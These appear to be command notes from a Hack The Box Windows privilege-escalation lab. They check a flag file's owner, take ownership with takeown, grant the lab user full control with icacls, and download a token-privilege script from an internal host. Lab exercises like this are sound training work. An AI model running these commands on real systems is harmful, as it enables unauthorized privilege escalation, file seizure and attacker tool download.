

 Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}


cmd /c dir /q 'C:\TakeOwn\flag.txt'

takeown /f 'C:\TakeOwn\flag.txt'
icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

Invoke-WebRequest -Uri "http://10.10.16.100:8080/EnableAllTokenPrivs.ps1" -OutFile "C:\Users\htb-student\Desktop\EnableAllTokenPrivs.ps1"